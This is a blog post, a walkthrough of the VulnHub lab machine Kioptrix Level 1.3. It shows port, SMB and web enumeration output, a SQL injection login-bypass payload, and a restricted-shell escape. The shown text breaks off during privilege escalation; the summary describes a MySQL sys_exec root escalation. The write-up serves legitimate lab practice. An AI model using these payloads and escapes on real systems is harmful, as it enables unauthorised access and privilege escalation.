<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Kioptrix Level 1.3 (#4) Writeup - VulnHub - Ash</title>
<meta name="description" content="Kioptrix Level 1.3 is the fourth iteration of the Kioptrix VulnHub challenges. It involves taking advantage of a SQL injection vulnerablility to login to a simple web application that leaks user credentials. Using these credentials we can connect to the box via SSH. Unfortunately, our SSH sessions spawn a restricted shell with very limited command availability. We use echo to spawn a full bash shell and escape these confines, from which we enumerate the box and find MySQL credentials. MySQL is running as root and we are able to use sys_exec to set the setuid bit on /bin/bash. From here we can simply execute the binary and receieve a root shell.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Ash">
<meta property="og:title" content="Kioptrix Level 1.3 (#4) Writeup - VulnHub">
<meta property="og:url" content="http://localhost:4000/Kioptrix-Level-1.3/">


  <meta property="og:description" content="Kioptrix Level 1.3 is the fourth iteration of the Kioptrix VulnHub challenges. It involves taking advantage of a SQL injection vulnerablility to login to a simple web application that leaks user credentials. Using these credentials we can connect to the box via SSH. Unfortunately, our SSH sessions spawn a restricted shell with very limited command availability. We use echo to spawn a full bash shell and escape these confines, from which we enumerate the box and find MySQL credentials. MySQL is running as root and we are able to use sys_exec to set the setuid bit on /bin/bash. From here we can simply execute the binary and receieve a root shell.">



  <meta property="og:image" content="http://localhost:4000/assets/images/VulnHub/kioptrix1.3_logo.png">





  <meta property="article:published_time" content="2020-07-29T00:00:00-04:00">





  

  


<link rel="canonical" href="http://localhost:4000/Kioptrix-Level-1.3/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "Ash",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Ash Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<link rel="shortcut icon" type="image/png" href="favicon.png">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/banner_logo.gif" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Kioptrix Level 1.3 (#4) Writeup - VulnHub</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/logo.png" alt="Ash" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Ash</h3>
    
    
      <p class="author__bio" itemprop="description">
        Unix lover. Red teamer. Interested in anything to do with computers.
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      
        
          
            <li><a href="https://twitter.com/_bin_Ash" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
          
        
          
            <li><a href="https://github.com/0xAsh" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
          
        
          
            <li><a href="https://keybase.io/ashhhhhhh" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-keybase" aria-hidden="true"></i> Keybase</a></li>
          
        
          
            <li><a href="https://www.hackthebox.com/home/users/profile/72624" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-cube" aria-hidden="true"></i> HackTheBox</a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Kioptrix Level 1.3 (#4) Writeup - VulnHub">
    <meta itemprop="description" content="Kioptrix Level 1.3 is the fourth iteration of the Kioptrix VulnHub challenges. It involves taking advantage of a SQL injection vulnerablility to login to a simple web application that leaks user credentials. Using these credentials we can connect to the box via SSH. Unfortunately, our SSH sessions spawn a restricted shell with very limited command availability. We use echo to spawn a full bash shell and escape these confines, from which we enumerate the box and find MySQL credentials. MySQL is running as root and we are able to use sys_exec to set the setuid bit on /bin/bash. From here we can simply execute the binary and receieve a root shell.">
    <meta itemprop="datePublished" content="July 29, 2020">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Kioptrix Level 1.3 (#4) Writeup - VulnHub
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-07-29T00:00:00-04:00">July 29, 2020 </time>&emsp;
          
          
        </p>
        <p>Kioptrix Level 1.3 is the fourth iteration of the Kioptrix VulnHub challenges. It involves taking advantage of a SQL injection vulnerablility to login to a simple web application that leaks user credentials.</p>

<p>Using these credentials we can connect to the box via SSH. Unfortunately, our SSH sessions spawn a restricted shell with very limited command availability.</p>

<p>We use <code class="language-plaintext highlighter-rouge">echo</code> to spawn a full bash shell and escape these confines, from which we enumerate the box and find MySQL credentials.</p>

<p>MySQL is running as root and we are able to use <code class="language-plaintext highlighter-rouge">sys_exec</code> to set the setuid bit on <code class="language-plaintext highlighter-rouge">/bin/bash</code>. From here we can simply execute the binary and receieve a root shell.</p>

<h1 id="enumeration">Enumeration</h1>

<p>As always, we’ll start with NMAP scans:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ein@~/VulnHub/Kioptrix1.3:<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-sSV</span> <span class="nt">-oN</span> kioptrix1.3 10.0.0.151
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-07-29 19:49 EDT
Nmap scan report <span class="k">for </span>10.0.0.151
Host is up <span class="o">(</span>0.000057s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 39528 closed ports, 26003 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
80/tcp  open  http        Apache httpd 2.2.8 <span class="o">((</span>Ubuntu<span class="o">)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch<span class="o">)</span>
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
MAC Address: 08:00:27:D6:E7:AD <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h3 id="enumerating-smb">Enumerating SMB</h3>

<p>Let’s go in reverse order here by hitting ports high-to-low. We’ll start with SMB using <code class="language-plaintext highlighter-rouge">enum4linux</code> (I’ve redacted useless output):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ein@~:<span class="nv">$ </span>enum4linux 10.0.0.151
Starting enum4linux v0.8.9 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Wed Jul 29 23:14:43 2020

 <span class="o">==========================</span> 
|    Target Information    |
 <span class="o">==========================</span> 
Target ........... 10.0.0.151
RID Range ........ 500-550,1000-1050
Username ......... <span class="s1">''</span>
Password ......... <span class="s1">''</span>
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 <span class="o">==================================================</span> 
|    Enumerating Workgroup/Domain on 10.0.0.151    |
 <span class="o">==================================================</span> 
<span class="o">[</span>+] Got domain/workgroup name: WORKGROUP

 <span class="o">==========================================</span> 
|    Nbtstat Information <span class="k">for </span>10.0.0.151    |
 <span class="o">==========================================</span> 
Looking up status of 10.0.0.151
        KIOPTRIX4       &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
        KIOPTRIX4       &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
        KIOPTRIX4       &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name

        MAC Address <span class="o">=</span> 00-00-00-00-00-00

 <span class="o">===================================</span> 
|    Session Check on 10.0.0.151    |
 <span class="o">===================================</span> 
<span class="o">[</span>+] Server 10.0.0.151 allows sessions using username <span class="s1">''</span>, password <span class="s1">''</span>

 <span class="o">====================================</span> 
|    OS information on 10.0.0.151    |
 <span class="o">====================================</span> 
Use of uninitialized value <span class="nv">$os_info</span> <span class="k">in </span>concatenation <span class="o">(</span>.<span class="o">)</span> or string at ./enum4linux.pl line 464.
<span class="o">[</span>+] Got OS info <span class="k">for </span>10.0.0.151 from smbclient: 
<span class="o">[</span>+] Got OS info <span class="k">for </span>10.0.0.151 from srvinfo:
        KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server <span class="o">(</span>Samba, Ubuntu<span class="o">)</span>
        platform_id     :       500
        os version      :       4.9
        server <span class="nb">type</span>     :       0x809a03

 <span class="o">===========================</span> 
|    Users on 10.0.0.151    |
 <span class="o">===========================</span> 
index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody   Name: nobody    Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert   Name: ,,,       Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root     Name: root      Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x4 RID: 0xbba acb: 0x00000010 Account: john     Name: ,,,       Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret       Name: loneferret,,,     Desc: <span class="o">(</span>null<span class="o">)</span>

user:[nobody] rid:[0x1f5]
user:[robert] rid:[0xbbc]
user:[root] rid:[0x3e8]
user:[john] rid:[0xbba]
user:[loneferret] rid:[0xbb8]

 <span class="o">=======================================</span> 
|    Share Enumeration on 10.0.0.151    |
 <span class="o">=======================================</span> 

        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        print<span class="nv">$ </span>         Disk      Printer Drivers
        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>Kioptrix4 server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.

        Server               Comment
        <span class="nt">---------</span>            <span class="nt">-------</span>

        Workgroup            Master
        <span class="nt">---------</span>            <span class="nt">-------</span>
        WORKGROUP            DESKTOP-PI36PQ0

<span class="o">[</span>+] Attempting to map shares on 10.0.0.151
//10.0.0.151/print<span class="nv">$ </span>    Mapping: DENIED, Listing: N/A
//10.0.0.151/IPC<span class="nv">$ </span>      <span class="o">[</span>E] Can<span class="s1">'t understand response:
NT_STATUS_NETWORK_ACCESS_DENIED listing \*

 ================================================== 
|    Password Policy Information for 10.0.0.151    |
 ================================================== 


[+] Attaching to 10.0.0.151 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] KIOPTRIX4
        [+] Builtin

 ===================================================================== 
|    Users on 10.0.0.151 via RID cycling (RIDS: 500-550,1000-1050)    |
 ===================================================================== 
...
...
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\loneferret (Local User)
S-1-22-1-1001 Unix User\john (Local User)
S-1-22-1-1002 Unix User\robert (Local User)

enum4linux complete on Wed Jul 29 23:14:53 2020

ein@~:$ 
</span></code></pre></div></div>

<p>There’s lots to unpack here, but mainly let’s note that there are some usernames we detected on the box:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>S-1-22-1-1000 Unix User<span class="se">\l</span>oneferret <span class="o">(</span>Local User<span class="o">)</span>
S-1-22-1-1001 Unix User<span class="se">\j</span>ohn <span class="o">(</span>Local User<span class="o">)</span>
S-1-22-1-1002 Unix User<span class="se">\r</span>obert <span class="o">(</span>Local User<span class="o">)</span>
</code></pre></div></div>

<p>And some shares which we don’t have access to:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">=======================================</span> 
|    Share Enumeration on 10.0.0.151    |
 <span class="o">=======================================</span> 

        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        print<span class="nv">$ </span>         Disk      Printer Drivers
        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>Kioptrix4 server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.

        Server               Comment
        <span class="nt">---------</span>            <span class="nt">-------</span>

        Workgroup            Master
        <span class="nt">---------</span>            <span class="nt">-------</span>
        WORKGROUP            DESKTOP-PI36PQ0

<span class="o">[</span>+] Attempting to map shares on 10.0.0.151
//10.0.0.151/print<span class="nv">$ </span>    Mapping: DENIED, Listing: N/A
//10.0.0.151/IPC<span class="nv">$ </span>      <span class="o">[</span>E] Can<span class="s1">'t understand response:
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
</span></code></pre></div></div>

<p>Cool, that should cover SMB. Moving on to HTTP.</p>

<h3 id="enumerating-http">Enumerating HTTP</h3>

<p>Per usual we’ll start by vising the website.</p>

<p><img src="/assets/images/VulnHub/Kioptrix1.3_1.PNG" alt="Website homepage" /></p>

<p>And we’ve got a login form. Let’s get <code class="language-plaintext highlighter-rouge">ffuf</code> running in the background while we keep looking:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ein@~:<span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.0.0.151/FUZZ

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git                                                                                                                                                                                                                          
________________________________________________                                                                                                                                                                                           
                                                                                                                                                                                                                                           
 :: Method           : GET                                                                                                                                                                                                                 
 :: URL              : http://10.0.0.151/FUZZ                                                                                                                                                                                              
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt                                                                                                                                                  
 :: Follow redirects : false                                                                                                                                                                                                               
 :: Calibration      : false                                                                                                                                                                                                               
 :: Timeout          : 10                                                                                                                                                                                                                  
 :: Threads          : 40                                                                                                                                                                                                                  
 :: Matcher          : Response status: 200,204,301,302,307,401,403                                                                                                                                                                        
________________________________________________                                                                                                                                                                                           
                                                                                                                                                                                                                                           
member                  [Status: 302, Size: 220, Words: 22, Lines: 2]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
images                  [Status: 301, Size: 348, Words: 23, Lines: 10]
index                   [Status: 200, Size: 1255, Words: 50, Lines: 46]
                        [Status: 200, Size: 1255, Words: 50, Lines: 46]
#                       [Status: 200, Size: 1255, Words: 50, Lines: 46]
# on atleast 2 different hosts [Status: 200, Size: 1255, Words: 50, Lines: 46]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 1255, Words: 50, Lines: 46]
#                       [Status: 200, Size: 1255, Words: 50, Lines: 46]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 1255, Words: 50, Lines: 46]
john                    [Status: 301, Size: 346, Words: 23, Lines: 10]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 1255, Words: 50, Lines: 46]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 1255, Words: 50, Lines: 46]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 1255, Words: 50, Lines: 46]
# This work is licensed under the Creative Commons  [Status: 200, Size: 1255, Words: 50, Lines: 46]
#                       [Status: 200, Size: 1255, Words: 50, Lines: 46]
# Copyright 2007 James Fisher [Status: 200, Size: 1255, Words: 50, Lines: 46]
#                       [Status: 200, Size: 1255, Words: 50, Lines: 46]
# directory-list-2.3-medium.txt [Status: 200, Size: 1255, Words: 50, Lines: 46]
robert                  [Status: 301, Size: 348, Words: 23, Lines: 10]
                        [Status: 200, Size: 1255, Words: 50, Lines: 46]
server-status           [Status: 403, Size: 330, Words: 24, Lines: 11]
:: Progress: [220560/220560] :: Job [1/1] :: 10502 req/sec :: Duration: [0:00:21] :: Errors: 0 ::
</span></code></pre></div></div>

<p>Hmm..<code class="language-plaintext highlighter-rouge">john</code> and <code class="language-plaintext highlighter-rouge">robert</code> stick out, let’s take a look:</p>

<p><img src="/assets/images/VulnHub/Kioptrix1.3_2.PNG" alt="Looking at the interesting sub-directories" /></p>

<h1 id="exploitation">Exploitation</h1>

<p>Just a directory listing, and it looks like clicking on either file just redirects us to the homepage:</p>

<p><img src="/assets/images/VulnHub/Kioptrix1.3_3.PNG" alt="302 Redirections" /></p>

<p>Weird, well lets account for any low hanging fruit, starting with some weak password/SQLi guessing. Remember at this point we have the following usernames to test with:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">john</code></li>
  <li><code class="language-plaintext highlighter-rouge">robert</code></li>
  <li><code class="language-plaintext highlighter-rouge">loneferret</code></li>
</ul>

<p>I’ll start with attempting to login as <code class="language-plaintext highlighter-rouge">john</code> with a password of <code class="language-plaintext highlighter-rouge">' OR '1'='1</code>:</p>

<p><img src="/assets/images/VulnHub/Kioptrix1.3_4.PNG" alt="302 Redirections" /></p>

<p>And sure enough that got us in. Let’s take a look at what the internal webpage looks like now.</p>

<p><img src="/assets/images/VulnHub/Kioptrix1.3_5.PNG" alt="Logged in page" /></p>

<p>Pretty straightforward, let’s try to use these creds to connect via SSH:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ein@~/VulnHub/Kioptrix1.3:<span class="nv">$ </span>ssh john@10.0.0.151
john@10.0.0.151<span class="s1">'s password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don'</span>t screw up
Type <span class="s1">'?'</span> or <span class="s1">'help'</span> to get the list of allowed commands
john:~<span class="nv">$ </span><span class="nb">help
cd  </span>clear  <span class="nb">echo  exit  help  </span>ll  lpath  <span class="nb">ls
</span>john:~<span class="nv">$ </span>
</code></pre></div></div>

<p>Interesting, we’re dropped in but we’re in a restricted shell.</p>

<p>Now that we have a working (but restricted) shell on the box, let’s try to exploit the available commands to break out of our <em>protections</em>.</p>

<p>First thing I notice is <code class="language-plaintext highlighter-rouge">echo</code>, maybe we can use this to execute a python command through <code class="language-plaintext highlighter-rouge">os.system()</code>?</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john:~<span class="nv">$ </span><span class="nb">echo </span>os.system<span class="o">(</span><span class="s1">'/bin/bash'</span><span class="o">)</span>
bash-3.2<span class="nv">$ </span><span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nv">$0</span>
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>john<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>john<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>john<span class="o">)</span>
/bin/bash
bash-3.2<span class="nv">$ </span>
</code></pre></div></div>

<p>Boom. Escaped the confines and have a full Bash session, now for privesc to root.</p>

<h1 id="privilege-escalation">Privilege Escalation</h1>

<p>I’ll begin by taking a look at the running processes on the host:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-3.2<span class="nv">$ </span>ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   2844  1692 ?        Ss   19:48   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>kthreadd]
root         3  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>migration/0]
root         4  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>watchdog/0]
root         6  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>events/0]
root         7  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>khelper]
root        41  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>kblockd/0]
root        44  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>kacpid]
root        45  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>kacpi_notify]
root        88  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>kseriod]
root       127  0.0  0.0      0     0 ?        S    19:48   0:00 <span class="o">[</span>pdflush]
root       128  0.0  0.0      0     0 ?        S    19:48   0:00 <span class="o">[</span>pdflush]                                                                                                                                                                 
root       129  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>kswapd0]                                                                                                                                                                 
root       171  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>aio/0]                                                                                                                                                                   
root      1277  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>ata/0]                                                                                                                                                                   
root      1284  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>ata_aux]                                                                                                                                                                 
root      1294  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>ksuspend_usbd]                                                                                                                                                           
root      1299  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>khubd]                                                                                                                                                                   
root      1968  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>scsi_eh_0]                                                                                                                                                               
root      1970  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>scsi_eh_1]                                                                                                                                                               
root      2186  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>kjournald]                                                                                                                                                               
root      2353  0.0  0.0   2224   632 ?        S&lt;s  19:48   0:00 /sbin/udevd <span class="nt">--daemon</span>                                                                                                                                                      
root      2573  0.0  0.0      0     0 ?        S&lt;   19:48   0:00 <span class="o">[</span>kpsmoused]                                                                                                                                                               
root      3864  0.0  0.0   1716   484 tty4     Ss+  19:48   0:00 /sbin/getty 38400 tty4                                                                                                                                                    
root      3867  0.0  0.0   1716   492 tty5     Ss+  19:48   0:00 /sbin/getty 38400 tty5                                                                                                                                                    
root      3873  0.0  0.0   1716   488 tty2     Ss+  19:48   0:00 /sbin/getty 38400 tty2                                                                                                                                                    
root      3876  0.0  0.0   1716   484 tty3     Ss+  19:48   0:00 /sbin/getty 38400 tty3                                                                                                                                                    
root      3881  0.0  0.0   1716   488 tty6     Ss+  19:48   0:00 /sbin/getty 38400 tty6                                                                                                                                                    
syslog    3913  0.0  0.0   1936   648 ?        Ss   19:48   0:00 /sbin/syslogd <span class="nt">-u</span> syslog                                                                                                                                                   
root      3932  0.0  0.0   1872   544 ?        S    19:48   0:00 /bin/dd bs 1 <span class="k">if</span> /proc/kmsg of /var/run/klogd/kmsg                                                                                                                         
klog      3934  0.0  0.0   3160  1968 ?        Ss   19:48   0:00 /sbin/klogd <span class="nt">-P</span> /var/run/klogd/kmsg
root      3953  0.0  0.0   5316   988 ?        Ss   19:48   0:00 /usr/sbin/sshd
root      4009  0.0  0.0   1772   528 ?        S    19:48   0:00 /bin/sh /usr/bin/mysqld_safe
root      4051  0.0  0.7 126988 16360 ?        Sl   19:48   0:00 /usr/sbin/mysqld <span class="nt">--basedir</span><span class="o">=</span>/usr <span class="nt">--datadir</span><span class="o">=</span>/var/lib/mysql <span class="nt">--user</span><span class="o">=</span>root <span class="nt">--pid-file</span><span class="o">=</span>/var/run/mysqld/mysqld.pid <span class="nt">--skip-external-locking</span> <span class="nt">--port</span><span class="o">=</span>3306 <span class="nt">--socket</span><span class="o">=</span>/var/run/mysqld/my
root      4053  0.0  0.0   1700   556 ?        S    19:48   0:00 logger <span class="nt">-p</span> daemon.err <span class="nt">-t</span> mysqld_safe <span class="nt">-i</span> <span class="nt">-t</span> mysqld
root      4126  0.0  0.0   6532  1356 ?        Ss   19:48   0:00 /usr/sbin/nmbd <span class="nt">-D</span>
root      4128  0.0  0.1  10108  2540 ?        Ss   19:48   0:00 /usr/sbin/smbd <span class="nt">-D</span>
root      4142  0.0  0.0  10108  1028 ?        S    19:48   0:00 /usr/sbin/smbd <span class="nt">-D</span>
root      4143  0.0  0.0   8084  1344 ?        Ss   19:48   0:00 /usr/sbin/winbindd
root      4148  0.0  0.0   8208  1704 ?        S    19:48   0:00 /usr/sbin/winbindd
daemon    4164  0.0  0.0   1984   424 ?        Ss   19:48   0:00 /usr/sbin/atd
root      4175  0.0  0.0   2104   888 ?        Ss   19:48   0:00 /usr/sbin/cron
root      4197  0.0  0.2  20464  6200 ?        Ss   19:48   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
dhcp      4247  0.0  0.0   2440   624 ?        Ss   19:48   0:00 dhclient eth2
root      4254  0.0  0.0   1716   488 tty1     Ss+  19:48   0:00 /sbin/getty 38400 tty1
root      4273  0.0  0.0   8084   868 ?        S    19:56   0:00 /usr/sbin/winbindd
root      4274  0.0  0.0   8092  1280 ?        S    19:56   0:00 /usr/sbin/winbindd
www-data  4615  0.0  0.2  20620  5936 ?        S    20:03   0:01 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  4617  0.0  0.2  20596  5732 ?        S    20:03   0:01 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  4620  0.0  0.2  20620  5944 ?        S    20:03   0:01 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  4660  0.0  0.2  20596  5664 ?        S    20:03   0:01 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  4676  0.0  0.2  20596  5688 ?        S    20:03   0:01 /usr/sbin/apache2 <span class="nt">-k</span> start
www-data  4679  0.0  0.2  20604  5672 ?        S    20:06   0:01 /usr/sbin/apache2 <span class="nt">-k</span> start
root      4886  0.0  0.1  11360  3732 ?        Ss   21:23   0:00 sshd: john <span class="o">[</span>priv]
john      4888  0.0  0.0  11516  1868 ?        S    21:23   0:00 sshd: john@pts/0 
